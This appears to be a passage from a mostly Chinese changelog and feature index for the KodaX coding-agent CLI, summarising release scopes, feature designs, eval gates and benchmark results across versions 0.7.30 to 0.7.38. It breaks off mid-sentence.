# Feature 总表

> Last updated: 2026-05-09 (**FEATURE_117 v2 ships v0.7.38 — Mutation Context Injection (write-child path)**：原 v1 "Read-Path Stripping" 经实施期事实核查反向——`child-executor.ts` 的 `systemPromptOverride: CHILD_AGENT_SYSTEM_PROMPT` 已短路 `buildSystemPrompt`，child 已处于 ~500 token 干净状态无 token 可省。**v2 实现**：在 `executeWriteChild` 通过 `buildWriteSystemPrompt(parentCtx.gitRoot)` helper 把 AGENTS.md 拼到 `CHILD_AGENT_SYSTEM_PROMPT` 后（read child 维持 minimal）；lookup 走 parent gitRoot 因为 worktree 是 transient checkout 不含 AGENTS.md；复用 FEATURE_149 Phase 1.2 mtime cache + FEATURE_116 cache_control: ephemeral 让多 child fan-out 仅一次计费。**配套清理（不属 117 范围）**：KodaX 只读 `AGENTS.md` 不读 `CLAUDE.md`，`agents-loader.ts:CONTEXT_FILE_CANDIDATES` 改为 `["AGENTS.md"]`，避免 CC 专属语义文件注入错配。**实现 ~17 LoC + 4 unit case**（write 注入 / 无 AGENTS.md fallback / read 不注入 / lookup 用 parent gitRoot），无新 prompt eval（仅复用项目已有 AGENTS.md 内容）。**v0.7.38 scope = FEATURE_149 + FEATURE_117 v2 双 feature 同版本 ship**。/ 此前更新：**FEATURE_149 added at v0.7.38 — Queued Prompt Injection Latency & Mid-Turn UX Parity**：用户实战反馈"输入 queue 排队指令时并没有尽快注入"，2026-05-08 forensic 双向 source 对照（KodaX vs `c:/Works/claudecode/src/`）确认非错觉，4 个延迟源叠加 floor 53ms / 上限 161ms 单轮排队：(L1) `InkREPL.tsx:6267` `stageQueuedPrompt` 末尾硬编码 `await new Promise(r => setTimeout(r, 50))` 不可避免 50ms；(L2) `agents-loader.ts:70` `loadAgentsFiles` 每轮 `existsSync`+`readFileSync` 全树遍历无 mtime cache（Claude Code 同源 `services/claudemd.ts` + `utils/fileReadCache.ts` 已 cache）；(L3) `StreamingContext.tsx:344` `FLUSH_INTERVAL=80` 流式节流可能延迟 round-complete 信号；(L4) `notify()` 走 `forceUpdate()` 而非 `useSyncExternalStore`。叠加 3 个架构 UX 缺口：(G1) 长 bash 跑 30s 时新 prompt 必须等完，无 `interruptBehavior: 'cancel'` 工具标记 + fast-abort 路径；(G2) `queued-prompt-sequence.ts` 一次 shift 一条跑一整轮，N 条排队=N 次 agent 调用（cost 浪费 + LLM 失去整体规划视角）；(G3) 只显示一行摘要 + Esc 砍最新，无 up-arrow popAllEditable 编辑/重排。**3 phase 实施**：Phase 1 Slice A 延迟清理零行为变更（A1 移除 setTimeout + A2 mtime cache + A3 round-complete 与 80ms FLUSH 解耦审计 + A4 useSyncExternalStore，~1 天，无 prompt eval）；Phase 2 Slice C UX 表面纯 UI（~0.5 天）；Phase 3 Slice B 行为变更触发 prompt eval（B1 fast-abort + B2 合成 tool_result + B3 批量 drain 多 user message 进单轮，~2 天，5 alias × 20 cells = 100 cells 预算 ~$8）。FAIL 单 slice 回退 v0.7.38.1，Phase 1+2 ship 不阻塞。/ 此前更新：**FEATURE_148 fold-in for v0.7.37 重发 — multi-turn async discipline eval**：用户实战日志观察到 Worker 在 Pattern B 多轮鲁棒性上有"派出去 → 立即 await"的 sync degeneration 模式，单轮 FEATURE_146-B eval 测不出（dispatch tool 不真执行，LLM 同轮拿不到 task_id 回执）。FEATURE_148 三件套：(1) `benchmark/harness/mock-child-executor.ts` 多轮 harness primitive + 9 metric 单测；(2) `worker-role-prompt.ts` `dispatchRules` 加 anti-immediate-await 反例硬约束 ("dispatch X, then DO Y, then await X")；(3) `tests/feature-148-multi-turn-discipline.eval.ts` 5 alias × 5 task = 25 cells 多轮 eval，FAIL gate immediate-await rate ≤ 70% / PASS aspiration ≤ 40%。原计划 v0.7.37.1 patch，最终 fold 进 v0.7.37 重发版本同期 ship。/ 此前更新：**v0.7.36 SHIPPED + 占位包发出 + FEATURE_146/147 立项 v0.7.37**：v0.7.36 全部 6 feature 已 ship 在 git tag `v0.7.36`，GitHub Release 已发。**npm 占位包 `@kodax-ai/cli@0.0.1` 已发布**——锁住 `@kodax-ai` 命名空间（unscoped `kodax` 被 npm 反 typosquat 政策以"与 koa/thdax 相似"拒绝，改 scoped 是 npm 官方建议）。**FEATURE_146 立项**：v0.7.36 三个 LLM-facing 改动（FEATURE_119/131-B/143）只跑了**结构 eval + dataset 回归**，把 96+20+60=176 cells 行为 eval（~$30 预算）正式 track 到 v0.7.37 quality gate。**FEATURE_147 立项**：v0.7.37 完成全套 npm 真实发布——9 个子包 `@kodax/xxx` → `@kodax-ai/xxx` 重命名 + `@kodax/ai` → `@kodax-ai/llm`（避免 `@kodax-ai/ai` 重复语义）+ 793 处 import + 55 处 dep + 6 处 tsconfig paths 批量替换 + `files`/`publishConfig` 字段 + 一键发布脚本，预估 ~1 天。/ 此前更新：**v0.7.36 scope 锁定 — FEATURE_130/131 design doc 落地，6-feature scope 同期 ship 不 defer**：v0.7.35.1 milestone（FEATURE_142/144/145）已 ship 在 commit `8465f1b`（git tag `0.7.35.1`），v0.7.36 主线启动前补完 RFC pending 状态的 FEATURE_130/131 design doc 进 [v0.7.36.md](features/v0.7.36.md)。**最终 v0.7.36 scope = 6 feature 同期 ship 不 defer**：(1) **FEATURE_114** AMA Harness V2（Worker+Evaluator 二角色，Evaluator 保留为 structural gate）；(2) **FEATURE_115** Message Queue Foundation（agentId-scoped 2 档优先级队列 + Sleep-gated mid-turn drain，吸收 FEATURE_111 soft-pause UX）；(3) **FEATURE_119** Async Child Dispatch Pattern B（launch + await 拆分，~100 行解决 Pattern A ~1500 行解决的同一问题）；(4) **FEATURE_130** Provider Retry-After + Exponential Backoff（**Async Safety Pack 之一**，跨 12 provider 标准化处理 4 个 retry-after header 形态 + UI 倒计时 status push，必须与 FEATURE_119 同期 ship 因为 Pattern B 多 child 并行直接拉高 429 概率，特别是 5 个共享 quota 的 coding plan provider：kimi/zhipu/mimo/ark/minimax-coding）；(5) **FEATURE_131** Tool Safety Patch Pack（**Async Safety Pack 之二**，Part A: file-mutation-queue.ts path-keyed 串行队列防多 child 同文件 race；Part B: edit-diff.ts:normalizeForFuzzyMatch NFKC + smart quotes/em-dash/全角字符 → ASCII 解决 KodaX 实战 silent edit-fail 主因）；(6) **FEATURE_143** Skill UX Upgrade + prompt-overlay 错位修正（v0.7.35.1 FEATURE_144 已修完 6 段 capability "missing data" 漂移，本 feature 收尾 1 段"position 类"漂移 + Skill 用户层 UX 三件）。**实施顺序**：Phase 0 doc 同步 → Phase 1 FEATURE_115 底座 → Phase 2 FEATURE_119/130/131 紧耦合 ship（Async Safety Pack 必须与 119 同期）→ Phase 3 FEATURE_143 独立并行 → Phase 4 prompt eval gate（合并 v0.7.35.1 FEATURE_144 multi-alias generalization sweep × 8 alias 共享 cold start cost）→ Phase 5 FEATURE_114 marquee（feature flag KODAX_HARNESS_V2=false 默认双轨保护）→ Phase 6 npm release `0.7.36`。**显式不 defer 任何 feature 到 v0.7.37+**——FEATURE_130/131 是 119 的 enable 不是可选项，scope 锁定后不再调整。/ 此前更新：**v0.7.35.1 scope 再扩展 — FEATURE_145 added (3rd v0.7.35.1 feature)**：在 FEATURE_142（包结构 + capability dedup helper）+ FEATURE_144（AMA worker capability parity 行为修复）基础上，加入 **FEATURE_145 — Agent Config Home Resolution Pipeline**。当前 `~/.kodax/` 在 6 个包共 ~30 处硬编码（仅 `@kodax/ai/reasoning-overrides.ts` 一处实现 `KODAX_HOME` env var 兜底，其余 29 处全无），导致 (a) 漂移风险（每加新 fs path 又一处硬编码）+ (b) substrate consumer 耦合（`@kodax/agent` 作为通用底座被未来 `@kodax/ops-agent` / `@kodax/data-analysis-agent` 等 consumer 调用时**无法重定向 config dir**，强制共享 `~/.kodax/` 命名空间）。**修法**：抽 `@kodax/agent/src/runtime/agent-home.ts` helper（~30 LoC），3-tier 优先级 resolution：(1) `setAgentConfigHome(path)` 程序入参（最高，substrate consumer boot 时 set）→ (2) `KODAX_HOME` env var（中，shell/CI/测试隔离）→ (3) `~/.kodax/` 硬编码 default（最低，standalone kodax CLI 90% 场景）。**Singleton pattern**（与 `process.env.NODE_ENV` 同模式），避免 per-call DI 改 ~50 个函数签名 invasive。**零行为变更**——DI 不传 + env 不设时与现状字节级等价；FEATURE_104 prompt eval 无需重跑。**显式不做** brand abstraction（YAGNI，DI 入参直接接受路径字符串足够）。验收用 grep gate：`grep -rE "['\"]\\.kodax['\"]" packages/*/src/` 命中数从 ~30 降到 ≤ 5。同 FEATURE_142 风险等级（零行为变更，编译器+grep gate 兜底），与之 ship 不阻塞 FEATURE_144。/ 此前更新：**v0.7.35.1 scope 扩展 — FEATURE_144 added; FEATURE_143 added at v0.7.36**: v0.7.35.1 调试版从单一 "Package Boundary Cleanup" 扩展为**双 feature ship**：(1) **FEATURE_142** 仍负责包结构 + Batch E `capability-sections.ts` dedup helper（零行为变更）；(2) **新增 FEATURE_144 — AMA Worker Capability Context Parity**：v0.7.26 FEATURE_084 把 AMA worker 从 SA path 迁到 Runner-driven 时漏接 6 段 capability prompt section（mcp-capability-context / skills-addendum / project-agents（AGENTS.md/CLAUDE.md）/ tool-construction / git-context / project-snapshot），过去 v0.7.26 + v0.7.27 FEATURE_086 手工补过 5 段（注释自陈），剩余 6 段一直 latent；用户实战已踩坑 3 项（MCP server 看不到 / skill 看不到 / KodaX 自身 CLAUDE.md 项目规则被 worker 忽略）。FEATURE_144 一次性接通这 6 段 + 新增 `gitContextSnapshot` / `projectSnapshotSnapshot` 两个 parent cache 字段（避免每 worker 重复 FS load）。**行为修复**——触发 FEATURE_104 prompt eval 重跑（`tests/ama-worker-capability-parity.eval.ts`，4 维度验收：不退化 instruction following / 主动调用 mcp_search / 遵守 CLAUDE.md 规则比率 / dirty repo Generator 主动声明 git 状态），mean ≥80% 通过率作为 ship gate。eval 失败 → FEATURE_144 单独回退到 v0.7.35.2 retry，FEATURE_142 ship 不阻塞。`prompt-overlay` 错位（user prompt 头 → system prompt，属"position 类"漂移而非"missing data 类"）+ Skill UX 升级（manifest 措辞硬化 / classic CLI 平等 / mid-line `/skill:foo` parser）→ **新增 FEATURE_143 at v0.7.36**，与 FEATURE_114/115/119 同期 ship，详见 [v0.7.36 FEATURE_143 设计](features/v0.7.36.md#feature_143-skill-ux-upgrade--prompt-overlay-错位修正)。/ 此前更新：**FEATURE_142 added — Package Boundary Cleanup at v0.7.35.1**: 修复 v0.7.24 FEATURE_082 包结构漂移。`@kodax/core` 30 文件全部并入 `@kodax/agent`（FEATURE_082 设计漂移：把 agent 错误定位为 coding-specific，导致 core 必须新建当通用 agent 入口；连环错误）；`@kodax/agent` 当前 session/persistence/compaction 回流 `@kodax/session-lineage`；Self-Construction 整体从 `coding/src/construction/` 迁到 `@kodax/agent/construction/`（v0.7.50 FEATURE_128 的硬前置）；coding/agent-runtime/ 通用 middleware 上提 `@kodax/agent/runtime-middleware/`（可选 Batch D，可延到 v0.7.36 同期做）。**`@kodax/capabilities` 死设计撤销**（FEATURE_082 设计但 `packages/capabilities/` 从未创建；FEATURE_084 真要落 Scout/Evaluator 时绕开它直接放 coding/agents/——证明是预先抽象）。**新增 ADR-021** 写明 `@kodax/agent` vs `@kodax/coding` 边界规则 + 何时才考虑再开 `core`（≥3 type-only consumer / 真实跨包横切设施需求 / ≥3 个非 coding agent 包，三条之一）。**ADR-001 更新** 反映 8 包结构（删 core，撤销 capabilities）。零业务逻辑改动；TypeScript 编译器 + grep gate 兜底。v0.7.36+ 全部 feature 的 package 归属重新对齐——messaging/orchestration/scratchpad/memory/team/construction/admission 全部落 `@kodax/agent`，coding-specific 工具壳和 role prompt 留 `@kodax/coding`，详见每个版本 design doc 的"影响范围"段已更新。/ 此前更新：**Version slots further shifted**: FEATURE_094 (Deep Anti-Escape Hardening) deferred from v0.7.37 → v0.7.42; FEATURE_111 (Runner-Level Soft-Pause Protocol) deferred from v0.7.38 → v0.7.43; v0.7.36-v0.7.41 left free for upcoming planning. File renames + cross-reference updates landed in this changelog entry. / 此前更新：**Version slots shifted**: FEATURE_094 deferred from v0.7.36 → v0.7.37; FEATURE_111 deferred from v0.7.37 → v0.7.38; v0.7.36 left free. / 此前更新：**v0.7.35 SHIPPED — hotfix-only release** for 3 FEATURE_092 / FEATURE_097 P0 issues found post-v0.7.34: (1) `coerceManagedProtocolToolPayload` skill_map nesting parser miss (FEATURE_097 — caused TodoListSurface to silently never render despite the seeding gate code being correct because the LLM-emitted nested form parsed to empty obligations); (2) `emit_scout_verdict` timing anchor (FEATURE_097 — Scouts were calling emit at the END as a final report instead of at the START as a plan commitment, so even when obligations parsed correctly the seeding fired with no execution time left; new EMIT TIMING block in role-prompt reframes this); (3) `defaultProvider` / `defaultModel` staleness across guardrail config + Ink REPL state ref-bridge (FEATURE_092 — mid-session `/model` swaps weren't retargeting the auto-mode classifier; double bug at coding-side string fields + Ink-side disconnected `const currentConfig` vs React state, fixed via optional getter fields + `inkCurrentConfigRef` mirroring existing askUser/engineChange ref pattern). FEATURE_111 design doc shifted from v0.7.35.md to v0.7.37.md (next free version slot; v0.7.36 already taken by Anti-Escape Hardening). / 此前更新：**FEATURE_112 added** — 用户实战反馈 KodaX 在 read-only 重度调研类任务上 Scout 永远 H0 单飞、不升 H1 audit 也不派 child；三轮独立调研 + 一轮对抗评审定位四点系统性偏差并修复：(a) `deriveTopologyCeiling` 加 complexity 维度（read-only + complex/systemic → H1 ceiling）；(b) `fanoutReason` 对 `primaryTask=unknown` 任务文案中性化（避免 LLM 收到负面 dispatch 信号）；(c) Scout role-prompt SCOPE COMMITMENT 对称扩展 read-scope rule + multi-thread early-decision rule（与 FEATURE_106 mutation rule 镜像）；(d) decisionSummary 给 ceiling 字段补 conditional 语义说明（让 Scout 知道 H1 = Evaluator audit）。**与 FEATURE_097/110 完全正交可并行 land**。改动表面：reasoning.ts ~12 LoC + role-prompt.ts ~15 LoC + 1 个新单测文件 9 测 + 4 cell × 3 alias eval 数据集 + 13 dataset shape 测试。**复用 FEATURE_106 prompt-only 路径实证**（mutation_h0_leakage 15.6% → 0% on 8 alias × 96 cells）；**显式不做** runtime guardrail（child-executor guardrail 转发耦合 + 触发时机错误 + compaction 副作用）/ 改 isAmaFanoutClassActive ambiguous gate（review/bugfix 在 ambiguous 下意外解锁 fan-out 风险）/ 给 unknown 一个 fanoutClass=evidence-scan（文案 semantics leak，与 clarify-first 指示矛盾）。**post-pilot eval 阈值**：`feature_112` 在 read-shallow-qa ≥ 95% H0 不退化；三个 deep class `read_scope_h1_rate` ≥ baseline + 30pp。详见 [v0.7.34 FEATURE_112 设计](features/v0.7.34.md#feature_112-investigation-scale-aware-routing--read-scope-fix)。/ 此前更新：**FEATURE_110 + FEATURE_111 added** — 经两轮辩论（极简派 vs 实用派）+ 两条路径并存的代码考古后，把 v0.7.34 共版本前置 `FEATURE_110 Remove Legacy Plan Mode (Path 1)` 和 v0.7.35 单交付 `FEATURE_111 Runner-Level Soft-Pause Protocol` 一起入库。**FEATURE_110**：KodaX 当前同时存在两套 plan-mode 实现（路径 1 = v0.3.1 时代 `/plan` slash + readline/chalk + plan-storage 持久化；路径 2 = v0.7.20 FEATURE_074 `PermissionMode="plan"` + `exit_plan_mode` tool + Ink-native PlanScrollPanel）且会真实打架（用户 `/plan on` + `PermissionMode="plan"` 时 wizard 步骤被 `planModeBlockCheck` 阻断却已 y 通过 confirm）。死代码铁证：路径 2 持续投入路径 1 上次实质改动是 v0.6 时代小修 + KNOWN_ISSUES 记录"plan-mode 路径不接 pendingInputs"两个版本未修。**改动表面**：删 `plan-mode.ts` (281 行) + `plan-storage.ts` (77 行) + 清理 5 处引用（`src/index.ts:54-60` re-export 是 public API 泄漏 README 未 document，CHANGELOG 标 breaking note；`InkREPL.tsx` 6 处使用；readline-based `repl.ts` 4 处使用——后者仍是 active 入口不能整文件砍只清 plan-mode 引用）。**用户磁盘 `~/.kodax/plans/*.json` 不自动迁移**（CHANGELOG 提示用户手动 `rm -rf`，为死功能写迁移代码是反向投入）。**总计 -460 ~ -500 行净删除，0 行新增**。**FEATURE_111**：填补现有 abort（丢整个 turn 上下文 Planner 已花 2000-6000 token 浪费）与 pending-inputs（`MAX_PENDING_INPUTS=5` 要等 LLM turn 自然结束才注入，长 tool 90s+ 时延迟到爽）之间的 UX 缺口。**设计**：runner loop 加单 `paused: boolean` 局部变量（不引入 `PauseToken` 不引入三状态机），tool 边界检查一次（不在 tool 执行中检查保持原子性）；新增 `KodaXEvents.waitForUserResume?(): Promise<string>` 让 UI 喂回 resume signal。**UI**：单击 ESC = soft-pause（spinner 变 "Paused — type to inject, Enter to resume"），输入任意内容+Enter = resume+注入（前置 `<user-interjected mid-task>` 标签让 LLM 知道是"插话"不是"新任务"），空 Enter = resume 不注入（统一"任意 Enter 都算 resume"），paused 状态再按 ESC = 升级为既有 abort 路径。**Prompt eval 硬性触发** FEATURE_104 规则，新增 `tests/soft-pause-interject.eval.ts` 在 8 alias mean ≥80% 通过率（与 FEATURE_106 同一阈值）。**总代码量 ~100 行**。**实施顺序硬性**：v0.7.34 内 FEATURE_110 先 land FEATURE_097 后 land（FEATURE_097 phase 4 "Plan Mode 联动"延伸只针对路径 2 无双写顾虑），v0.7.35 再做 FEATURE_111。/ 此前更新：**v0.7.33 SHIPPED — FEATURE_092 Auto Mode Classifier 完整交付**：Phase 1 (`@kodax/ai sideQuery`) + Phase 2a (`GuardrailContext.messages`) + Phase 2b 全 9 个 sub-phase（projection helpers / JSONC loader / classifier core / denial tracker + circuit breaker / model resolver / `AutoModeToolGuardrail` 集成 / canonical `'auto'` permission mode / settings+CLI+env 串接 / slash 命令 + 状态栏指示）+ Phase 2b.9 eval 数据集 + §7 跨 provider release-gate eval（`KODAX_EVAL_AUTO_MODE_CROSS_PROVIDER=1`，3 组合 ds/v4flash↔kimi↔zhipu/glm51 全绿）。Ink REPL 与 readline REPL 双 surface 等价集成，`bootstrapAutoMode` 抽 surface-agnostic `askUser` 接口避开 readline 硬依赖；`/auto` slash 命令切到 canonical `'auto'`（`'auto-in-project'` 保留为 deprecated alias 触发 once-per-session 弃用提示）；状态栏文本采用 Title-Case short labels（`Plan`/`Edits`/`Auto[LLM]`/`Auto[RULES]`，对齐 Claude Code `permissionModeShortTitle`），通过新 `permissionModeDisplayName` helper 在两 surface 上单一 source of truth。**关键修复**：跨 provider eval 跑出 `classify()` 把 `sideQuery` 返回的 immutable cost-tracker 拷贝丢弃的 latent bug，通过 `ClassifyOptions.setCostTracker` 回写解决；GLM external review 5 个 P1 + 3 个 P2 全部修复（含 `agentsFilesRef` 写回断链 P1-3 + `onEngineChange`/`setCostTracker` 测试覆盖 P1-1/P1-2 + Ink view-model status-bar 测试 P1-4）。**ACP 范围说明**：canonical `'auto'` mode **不**通过 ACP 协议暴露，ACP client 看到 legacy 3-mode 集（`plan`/`accept-edits`/`auto-in-project`），见 `src/acp_server.ts` 的 `ACP_PERMISSION_MODE_IDS` 注释；分类器需要交互式 `askUser` surface（readline / Ink confirm dialog），ACP-native classifier-escalate channel 留待后续版本。/ 此前更新：**v0.7.32 SHIPPED — FEATURE_090 + FEATURE_107 同版本交付**：(1) **FEATURE_090 Self-Construction Tier 4 — Agent Self-Modifying Role Spec** 实装 5 条反身稳定保障 (G1 deferred resolver swap / G2 LLM diff summary + force-ask-user / G3 modification budget N=3 / G4 chained rollback / G5 append-only audit log with diff hash) + 内部工具 `stage_self_modify` (sourceAgent === name guard) + 4 条 CLI (`kodax constructed audit/rollback/disable-self-modify/reset-self-modify-budget`) + REPL 端接通 `selfModifyAskUser` dialog + `drainPendingSwaps()` 在 `runAgentRound` finally 边界 drain。**295 个新测试全绿**（construction 单测 + CLI 集成 + 7 条 adversarial regression + REPL bootstrap 集成）。整条 Plan B 路线图终点。(2) **FEATURE_107 AMA H2 Plan-Execute Boundary Eval** 完成数据驱动的架构清算：H2 plan-execute boundary eval harness + 18 case h2-plan-execute-boundary dataset (1 real + 17 hand-curated, 经 Pool 3 archaeology 验证) + adaptive compaction + v3 discipline + delete eval-only hooks。eval 跑完后明确 H1/H2 边界保留现状决策，不在代码层固化变体 B。(3) 顺手清理：`docs/CODING_AGENT_PROMPTS.md` 4-project prompt-system cross-reference for KodaX prompt design + `docs/features/v0.7.47.md` (FEATURE_108) + `docs/features/v0.7.48.md` (FEATURE_109) 设计稿先入库。/ 此前更新：**v0.7.31 SHIPPED — FEATURE_101 + FEATURE_089 + FEATURE_106 三 feature 同版本交付**：(1) FEATURE_101 Constructed Agent Admission Contract 实装 8 个 v1 invariant + Runner.admit 5 步审核 pipeline + capability tier 分类（51 个 admission 测试全绿）；(2) FEATURE_089 Self-Construction Tier 3 Agent Generation 实装 5 阶 staircase（scaffold/validate/stage/test/activate）+ AGENT_REGISTRY resolver + sandbox-runner Promise.race timeout + activate-time re-admission（87 个新测试，185 个 construction 测试全绿）；(3) FEATURE_106 AMA Harness Selection Calibration 实装 ToolGuardrail-based scope reflection + Scout role-prompt SCOPE COMMITMENT hard rule + harnessSelectionTiming invariant 注册。**Stage 1 benchmark 实测**（96 cells × 8 alias / 6 task / 2 prompt variant，11m29s wall-clock）：multi_file_h0_rate 从 baseline 15.6% 降到 **0.0%**（acceptance gate ≤5% 显著超过）；H1-class pass rate 从 37.5% 提到 87.5%（+50pp）；`pre_emit_commitment_rate` 从 65.6% 提到 **84.4%**（≥70% 验收门，hard rule 把 wrong-harness 5→0 全消）；H0/H2 表面 -12.5pp 退化经逐 cell 验证全部为 benchmark format-fail（模型尝试调用 read/grep/bash 工具去验证 lookup 答案，是 production 中正确行为，benchmark harness 不提供工具导致输出缺 HARNESS: 行）。**Stage 2 reasoning sweep 实测**（108 cells × 3 alias × 2 prompt × 3 reasoning，7m57s wall-clock）：reasoning 三档（low/medium/high）对 multi_file_h0_rate **零影响**（current 三档全 8.3%，feature_106 三档全 0.0%）—— **反向证明 v0.7.30 设计稿"FEATURE_103 reasoning 越深越自信沉 H0"假说不成立**；按设计 §Eval Plan 决策规则"三档差异 noise 内 → 保留 FEATURE_103"，**保留 reasoning 配置 `default=balanced` / `max=deep` / `escalateOnRevise=false`**（基于 0pp 数据差异，不是设计默认）。Harness 扩展实测：`provider.stream` 第 4 参数 v0.7.0 起就接受 `KodaXReasoningRequest`，harness 只是没传，5 处 small edits 即可，FEATURE_106 scope 内可做。详见 [v0.7.31 §Eval Results](features/v0.7.31.md#eval-results--stage-12026-04-29-实测)。/ 此前更新：**FEATURE_106 added — AMA Harness Selection Calibration, planned for `v0.7.31`**：v0.7.30 实战观察发现复杂多文件项目全部沉到 H0_DIRECT，多 LLM 根因分析定位 6 个贡献因子叠加：(1) 路由启发式 [`reasoning.ts:2737`](packages/coding/src/reasoning.ts) 默认 `H0_DIRECT`（FEATURE_061 v0.7.16 设计意图，保留）；(2) Scout tool policy `undefined` = 全套 write/edit/multi_edit/bash 放行（[`tool-policy.ts:362-364`](packages/coding/src/task-engine/_internal/managed-task/tool-policy.ts)）；(3) Scout role-prompt `H0 (default)` + emit "optional"（v0.7.26 c4f4514 "simplify AMA Scout — optional protocol" 引入，需收紧）；(4) **scope reflection middleware 在 AMA 路径完全失效**（v0.7.26 FEATURE_084 把 AMA 从 `runDirectKodaX → runKodaX` 迁到 `Runner.run → genericRun`，后者不调 substrate 的 `applyPostToolProcessing`，scope reflection 静默失效，bug latent 自 v0.7.26）；(5) **reflection 文本引用 stale tool name `emit_managed_protocol`**（v0.7.22 旧名，AMA 实际 emit 工具是 `emit_scout_verdict`，bug）；(6) v0.7.29 FEATURE_103 Scout reasoning `quick→balanced` 让 Scout 更自信"我能搞定"——三层叠加在 v0.7.30 全部显形。**FEATURE_106 三 slice 修复**：(1) scope reflection 升级为 ToolGuardrail（与 v0.7.37 anti-escape 同源范式，挂 `scoutSpec/generatorSpec.guardrails`，`afterTool` 拦截），文案修正为 `emit_scout_verdict` 并对齐 [`protocol-emitters.ts`](packages/coding/src/agents/protocol-emitters.ts) 的 payload shape；(2) Scout role-prompt 重写——去掉 `H0 (default)` 措辞、量化 H0 边界（≤1 file ≤30 lines）、SCOPE COMMITMENT 从主观 self-check 升级为 hard rule（≥2 files OR 从零搭项目必须先 `emit_scout_verdict`）；(3) `harnessSelectionTiming` 注册为 FEATURE_101 第 8 项 Quality Invariant（observe-only severity=`warn`，记录不阻断）。**Eval 流程不依赖线上反馈**：所有 prompt 改动 + reasoning 档位决策跨 FEATURE_104 alias 表 8 个 coding-plan provider/model（`zhipu/glm51` / `kimi` / `mimo/v25` / `mimo/v25pro` / `mmx/m27` / `ark/glm51` / `ds/v4pro` / `ds/v4flash`，跨 5 个独立 provider 家族盲区互补）跑 `benchmark/harness/`，Stage 1（48 cases）验证 8 alias 上不退化，Stage 2（108 cases）跨 prompt × reasoning 矩阵验证 `multi_file_h0_rate` ≤5% 并给 FEATURE_103 reasoning 决断提供量化支撑（保留 balanced OR 回退 quick 由数据决定，不预设结论）。**三 feature 同版本不互相阻塞**：FEATURE_101 提供 admission protocol + invariant runtime；FEATURE_089 实装 generation 流程消费 admission；FEATURE_106 复用 invariant runtime + ToolGuardrail runtime + prompt eval harness（三个底座 v0.7.26 FEATURE_085 + v0.7.31 FEATURE_101 + v0.7.29 FEATURE_104 全部就位）。**显式不做**：P0 hotfix 单独发 patch（取消，全部合 v0.7.31 一次修完整）；改 H0_DIRECT 路由启发式（FEATURE_061 设计意图保留）；改 Scout tool policy（H0 内仍需 write/edit）；动 admission scope（FEATURE_101 自管 7 项 closed set，106 注册第 8 项是外部消费者用法）；引入用户层新 mode（SA/AMA 稳定，ADR-003）。详见 [v0.7.31 FEATURE_106 设计](features/v0.7.31.md#feature_106-ama-harness-selection-calibration)。/ 此前更新：**FEATURE_096 迁入 v0.7.30 + FEATURE_057 Track F 重新分类为必交付**：(1) FEATURE_096 原计划 `v0.7.39`，2026-04-28 提前同版本交付与 FEATURE_057 一起落地。理由：改动核心域 (`packages/repl/src/tui/runtime.ts`) 与 057 共享、设计稿自陈是 057 fullscreen 主线的"降级逃生门"、单独留在 v0.7.39 会让 Windows-SSH 用户在 057 落地后到 v0.7.39 之间长期断档。改动表面：5 个文件（runtime.ts + 4 个 test 文件），全部是"加分支"而非"改既有逻辑"。原 `docs/features/v0.7.39.md` 已并入 `v0.7.30.md`，git history 保留全部修订。逃生开关命名采用 `KODAX_FULLSCREEN={1\|0\|未设}` 三态单变量 pattern（NO_COLOR / FORCE_COLOR 风格），围绕 fullscreen 决策直接命名而非 mouse；`=0` 联动关 fullscreen + 关 mouse + spinner-only（关流式 token），避免早期 `KODAX_DISABLE_MOUSE=1` "保留 fullscreen 但关 mouse" 的死状态（alt-screen 屏蔽终端 scrollback + 应用不接管滚轮 = 滚轮永远无效）。**main-screen 路径 streamingPreview 改为 false 是 v0.7.30 落地后追加的修正**：根因不是表面 ghost frame 而是 Windows conhost 的 cursor-up viewport yank bug（[microsoft/terminal#14774](https://github.com/microsoft/terminal/issues/14774)）—— 字符串级 `log-update` 每帧 `cursor up + eraseLines` 跨 viewport 上沿时 conhost 的 `SetConsoleCursorPosition` 把用户视图甩到 scrollback 顶端，每个 streaming token 触发 yank 一次，用户必须手动滚回底部；fullscreen + alt-screen 主线下 alt buffer 与主屏 scrollback 物理隔离不暴露此 bug，但 main-screen 路径直接命中。对齐 Claude Code `c:/Works/claudecode/src/ink/terminal.ts:177-179` 的 `hasCursorUpViewportYankBug` 与 `c:/Works/claudecode/src/screens/REPL.tsx:1463` 的 `showStreamingText = !reducedMotion && !hasCursorUpViewportYankBug()` 实现（与 KodaX `hasCursorUpViewportYankRisk` 判据完全一致：`platform === 'win32' || WT_SESSION`）。Track F 落地后绝对坐标 CSI 不发 cursor-up，main-screen 下流式可重新开启。(2) FEATURE_057 Track F (cell-level diff renderer，吸收自 FEATURE_095) 重新分类为 v0.7.30 必交付项不 defer。Audit 确认当前 renderer 状态：组件层已 vendor 自 npm `ink`（不再 import `'ink'` package），但渲染机制层仍是 `log-update.js` 字符串级 full-frame 重写（`tui/substrate/ink/log-update.js` 241 行 + `tui/core/internals/log-update.js` 310 行），不是 Claude Code `src/ink/log-update.ts` 的 cell-level diff。defer Track F = 057 半成品交付 + FEATURE_096 Windows-SSH 用户 main-screen 体验下永久受限于"无流式 token 输出"约束（虽然 FEATURE_096 spinner-only 修复消除了 yank 现象，但用户失去了 streaming UX），不可接受。Track F 与 Track E (output ownership purify) 配套，两者均必交付。 / 此前更新：FEATURE_105 added — Verifiable Advisor Consult Primitive, planned for `v0.7.46`，详见 [v0.7.46 设计稿](features/v0.7.46.md#feature_105-verifiable-advisor-consult-primitive)。把 Anthropic 服务端 Advisor Strategy（`advisor_20260301`：executor 主动 consult 大 advisor，blog 数据 SWE-bench Multilingual +2.7pp / 单任务成本 -11.9% / Haiku+Opus 在 BrowseComp 19.7%→41.2% 比 Sonnet solo 便宜 85%）落地到 KodaX 客户端，做成 executor 在 tool loop 内部按需咨询第二个 model 的原语。**KodaX 风格差异**：跨 provider 异构盲区互补（Anthropic 原版只能同家族）/ 强类型 4 字段 verdict（recommendation / advice / verification / risk）/ 客观信号闭环（advisor 给 verification_command，executor 跑后回灌 trace，把 v0.7.45 / FEATURE_102 哲学从"事后 review"延伸到"事前 consult"）/ "advice, not instruction" 防御标记（防 advisor 输出回流 prompt injection）。**核心判断**：MVP 是 single-advisor primitive，**不**做 Council / specialty 5 类扩展 / hard escalation triggers / runtime 主动注入 advisor turn，这些交给 ship 后侦察性 benchmark 反推（5–10 case + 2–3 外部锚 case + 客观信号裁决 + commit hash 绑定 + 时间盒严格，目标机制可见而非数字精确）；**密集开发期 trace ≠ 用户分布**（KodaX 当前每天 1-2 版迭代，trace 是开发者迭代分布），Council 决策由 benchmark 驱动而非 